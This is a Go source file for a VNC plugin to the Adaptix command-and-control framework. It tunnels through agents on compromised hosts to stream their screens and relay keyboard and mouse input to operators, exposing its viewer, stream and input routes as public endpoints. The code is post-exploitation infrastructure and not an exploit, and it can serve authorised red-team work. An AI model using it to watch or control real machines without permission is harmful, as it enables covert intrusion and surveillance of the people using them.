package main

import (
	"embed"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"sync"

	adaptix "github.com/Adaptix-Framework/axc2"
	"gopkg.in/yaml.v3"
)

//go:embed web/*
var webFiles embed.FS

type PluginService struct{}

var (
	Ts        Teamserver
	ModuleDir string
	Config    VncConfig
	sessions  = make(map[string]*VncSession)
	sessLock  sync.RWMutex
)

type Teamserver interface {
	TsEndpointRegister(method string, path string, handler func(username string, body []byte) (int, []byte)) error
	TsEndpointRegisterPublicRaw(method string, path string, handler func(w http.ResponseWriter, r *http.Request)) error
	TsServiceSendDataAll(service string, data string)
	TsServiceSendDataClient(operator string, service string, data string)
	TsExtenderDataSave(extenderName string, key string, value []byte) error
	TsExtenderDataLoad(extenderName string, key string) ([]byte, error)
	TsTunnelCreateLportfwd(AgentId string, Info string, Lhost string, Lport int, Thost string, Tport int) (string, error)
	TsTunnelStart(TunnelId string) (string, error)
	TsTunnelStop(TunnelId string) error
	TsTunnelList() (string, error)
}

type VncConfig struct {
	ViewerRoute            string `yaml:"viewer_route" json:"viewer_route"`
	StreamRoute            string `yaml:"stream_route" json:"stream_route"`
	InputRoute             string `yaml:"input_route" json:"input_route"`
	ApiRoute               string `yaml:"api_route" json:"api_route"`
	DefaultPort            int    `yaml:"default_port" json:"default_port"`
	BindHost               string `yaml:"bind_host" json:"bind_host"`
	AgentBinaryName        string `yaml:"agent_binary_name" json:"agent_binary_name"`
	StreamQuality          int    `yaml:"stream_quality" json:"stream_quality"`
	StreamIntervalMs       int    `yaml:"stream_interval_ms" json:"stream_interval_ms"`
	StreamHeaderTimeoutSec int    `yaml:"stream_header_timeout_sec" json:"stream_header_timeout_sec"`
	StreamDialTimeoutSec   int    `yaml:"stream_dial_timeout_sec"   json:"stream_dial_timeout_sec"`
}

func InitPlugin(ts any, moduleDir string, serviceConfig string) adaptix.PluginService {
	Ts = ts.(Teamserver)
	ModuleDir = moduleDir

	Config = VncConfig{
		ViewerRoute:            "/vnc/viewer",
		StreamRoute:            "/vnc/stream",
		InputRoute:             "/vnc/input",
		ApiRoute:               "/vnc/api",
		DefaultPort:            40484,
		BindHost:               "0.0.0.0",
		AgentBinaryName:        "vnc_stream.exe",
		StreamQuality:          75,
		StreamIntervalMs:       50,
		StreamHeaderTimeoutSec: 60,
		StreamDialTimeoutSec:   10,
	}
	if serviceConfig != "" {
		if err := yaml.Unmarshal([]byte(serviceConfig), &Config); err != nil {
			fmt.Printf("[VNC] Error parsing config: %v\n", err)
		}
	}

	Ts.TsEndpointRegisterPublicRaw("GET", Config.ViewerRoute, handleViewer)
	Ts.TsEndpointRegisterPublicRaw("GET", Config.StreamRoute, handleStream)
	Ts.TsEndpointRegisterPublicRaw("POST", Config.InputRoute, handleInput)
	Ts.TsEndpointRegister("POST", Config.ApiRoute+"/session/start", handleSessionStart)
	Ts.TsEndpointRegister("POST", Config.ApiRoute+"/session/stop", handleSessionStop)
	Ts.TsEndpointRegister("GET", Config.ApiRoute+"/sessions", handleSessionList)
	Ts.TsEndpointRegister("POST", Config.ApiRoute+"/screen", handleScreenSwitch)
	Ts.TsEndpointRegister("POST", Config.ApiRoute+"/quality", handleQuality)

	fmt.Printf("[VNC] Service initialized. Viewer: %s, Stream: %s, Input: %s, API: %s, stream_dial_timeout_sec=%d, stream_header_timeout_sec=%d\n",
		Config.ViewerRoute, Config.StreamRoute, Config.InputRoute, Config.ApiRoute,
		Config.StreamDialTimeoutSec, Config.StreamHeaderTimeoutSec)

	return &PluginService{}
}

func (p *PluginService) Call(operator string, function string, args string) {}

func handleViewer(w http.ResponseWriter, r *http.Request) {
	data, err := webFiles.ReadFile("web/viewer.html")
	if err != nil {
		http.Error(w, "Viewer not found", 404)
		return
	}
	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write(data)
}

func handleSessionStart(username string, body []byte) (int, []byte) {
	var req struct {
		AgentId    string `json:"agent_id"`
		TargetPort int    `json:"target_port"`
		LocalPort  int    `json:"local_port"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		return 400, jsonError("invalid request: " + err.Error())
	}
	if req.AgentId == "" {
		return 400, jsonError("agent_id is required")
	}
	if req.TargetPort == 0 {
		req.TargetPort = Config.DefaultPort
	}
	if req.LocalPort == 0 {
		req.LocalPort = req.TargetPort + 1000
	}

	session, err := createSession(req.AgentId, req.TargetPort, req.LocalPort, username)
	if err != nil {
		return 500, jsonError(err.Error())
	}

	resp, _ := json.Marshal(map[string]interface{}{"ok": true, "session": session})
	return 200, resp
}

func handleSessionStop(username string, body []byte) (int, []byte) {
	var req struct {
		SessionId string `json:"session_id"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		return 400, jsonError("invalid request: " + err.Error())
	}

	if err := stopSession(req.SessionId); err != nil {
		return 500, jsonError(err.Error())
	}

	resp, _ := json.Marshal(map[string]interface{}{"ok": true})
	return 200, resp
}

func handleSessionList(username string, body []byte) (int, []byte) {
	sessLock.RLock()
	defer sessLock.RUnlock()

	list := make([]*VncSession, 0, len(sessions))
	for _, s := range sessions {
		list = append(list, s)
	}

	resp, _ := json.Marshal(map[string]interface{}{"ok": true, "sessions": list})
	return 200, resp
}

func handleScreenSwitch(username string, body []byte) (int, []byte) {
	var req struct {
		SessionId string `json:"session_id"`
		Screen    int    `json:"screen"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		return 400, jsonError("invalid request: " + err.Error())
	}

	sessLock.RLock()
	session, ok := sessions[req.SessionId]
	sessLock.RUnlock()
	if !ok {
		return 404, jsonError("session not found")
	}

	_ = forwardToTarget(session, "GET", fmt.Sprintf("/switch.js?screen=%d", req.Screen), nil)

	resp, _ := json.Marshal(map[string]interface{}{"ok": true})
	return 200, resp
}

func handleQuality(username string, body []byte) (int, []byte) {
	var req struct {
		SessionId string `json:"session_id"`
		Quality   int    `json:"quality"`
	}
	if err := json.Unmarshal(body, &req); err != nil {
		return 400, jsonError("invalid request: " + err.Error())
	}

	sessLock.RLock()
	session, ok := sessions[req.SessionId]
	sessLock.RUnlock()
	if !ok {
		return 404, jsonError("session not found")
	}

	session.Quality = req.Quality

	resp, _ := json.Marshal(map[string]interface{}{"ok": true})
	return 200, resp
}

func jsonError(msg string) []byte {
	data, _ := json.Marshal(map[string]interface{}{"ok": false, "message": msg})
	return data
}

func saveConfig() {
	configPath := filepath.Join(ModuleDir, "config.yaml")

	full := struct {
		ExtenderType  string    `yaml:"extender_type"`
		ExtenderFile  string    `yaml:"extender_file"`
		AxFile        string    `yaml:"ax_file"`
		ServiceName   string    `yaml:"service_name"`
		ServiceConfig VncConfig `yaml:"service_config"`
	}{
		ExtenderType:  "service",
		ExtenderFile:  "vnc.so",
		AxFile:        "ax_config.axs",
		ServiceName:   "vnc",
		ServiceConfig: Config,
	}

	data, err := yaml.Marshal(&full)
	if err != nil {
		fmt.Printf("[VNC] Error marshaling config: %v\n", err)
		return
	}

	if err := os.WriteFile(configPath, data, 0644); err != nil {
		fmt.Printf("[VNC] Error saving config: %v\n", err)
	}
}
